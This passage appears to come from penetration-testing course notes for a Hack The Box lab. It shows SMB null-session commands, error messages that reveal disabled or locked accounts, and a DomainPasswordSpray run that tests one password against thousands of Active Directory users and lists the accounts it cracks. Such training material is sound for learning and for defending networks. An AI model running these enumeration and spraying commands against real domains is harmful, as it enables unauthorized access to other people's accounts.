#### SMB NULL Sessions
```cmd
net use \\host\ipc$ "" /u:""
```
##### Error: Account is Disabled
```cmd
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```
##### Error: Password is Incorrect
```cmd
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```
##### Error: Account is locked out (Password Policy)
```cmd
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```
### Password Spraying
If we are authenticated to the domain, [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. We can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.
#### Using DomainPasswordSpray.ps1
```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```
Since the host is domain-joined, we skip the `-UserList` flag and let the tool generate a list for us.
